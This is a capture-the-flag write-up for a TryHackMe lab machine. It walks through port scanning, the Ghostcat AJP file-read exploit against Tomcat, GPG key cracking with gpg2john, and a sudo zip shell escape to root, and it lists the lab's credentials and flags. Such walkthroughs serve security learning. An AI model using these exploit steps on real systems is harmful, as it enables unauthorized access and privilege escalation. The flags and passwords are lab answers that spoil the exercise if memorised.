# TryHackMe-Thompson

> Abdullah Rizwan | 20th September , 10:15 PM

## NMAP


```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-20 13:15 EDT
Nmap scan report for 10.10.109.92
Host is up (0.17s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.92 seconds

```


## Gobuster

```
gobuster dir -u http://$IP:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-m
edium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.109.92:8080
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/20 13:18:06 Starting gobuster
===============================================================
/docs (Status: 302)
/examples (Status: 302)
/manager (Status: 302)

```

When we visit `/manger` we are not prompt with login.

https://imgur.com/fQZgbPW.png

Now we can look for port `8009` and there is an exploit for it `https://github.com/00theway/Ghostcat-CNVD-2020-10487.git`

Run the exploit 

```
python3 ajpShooter.py http://10.10.109.92:8080 8009 /WEB-INF/web.xml read
``` 

https://imgur.com/iVdmiAn.png


You will find credential `skyfuck`:`8730281lkjlkjdqlksalks`


https://imgur.com/g1atsoj.png

Going to `merlin`'s folder we can find `THM{GhostCat_1s_so_cr4sy}`

we can see two files `credentials.pgp` and `tryhackme.asc` so we are going to use `gpg2john` to find hash of  `tryhackme.asc`

https://imgur.com/dwB310K.png

https://imgur.com/nj8nfcL.png

```
alexandru        (tryhackme)
```

We will use gpg to import a file 

```
skyfuck@ubuntu:~$ gpg --import tryhackme.asc 
gpg: keyring `/home/skyfuck/.gnupg/secring.gpg' created
gpg: key C6707170: secret key imported
gpg: key C6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key C6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

```
Then we will specify from using `tryhackme.asc` we will decrypt `credential.pgp` by using `alexandru `.
```
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp 

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123jskyfuck@ubuntu:~$ 

```
We are given a username and password

`merlin`:`asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`

```
skyfuck@ubuntu:~$ su merlin
Password: 
merlin@ubuntu:/home/skyfuck$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
merlin@ubuntu:/home/skyfuck$ 

```
We can run `zip` as root so let's find how we can escalate our privileges.

## Privilege Escalation

Visiting `https://gtfobins.github.io/gtfobins/zip/` 
```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```



```
merlin@ubuntu:/home/skyfuck$ TF=$(mktemp -u)
merlin@ubuntu:/home/skyfuck$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# whoami
rm: missing operand
Try 'rm --help' for more information.
# ls -la
total 44
drwxr-xr-x 4 skyfuck skyfuck 4096 Sep 20 10:55 .
drwxr-xr-x 4 root    root    4096 Mar 10  2020 ..
-rw------- 1 skyfuck skyfuck  167 Sep 20 11:10 .bash_history
-rw-r--r-- 1 skyfuck skyfuck  220 Mar 10  2020 .bash_logout
-rw-r--r-- 1 skyfuck skyfuck 3771 Mar 10  2020 .bashrc
drwx------ 2 skyfuck skyfuck 4096 Sep 20 10:48 .cache
-rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10  2020 credential.pgp
drwx------ 2 skyfuck skyfuck 4096 Sep 20 11:16 .gnupg
-rw-r--r-- 1 skyfuck skyfuck  655 Mar 10  2020 .profile
-rw-rw-r-- 1 skyfuck skyfuck 5144 Mar 10  2020 tryhackme.asc
# whoami
root
# 

```
We are now root.

`THM{Z1P_1S_FAKE}`.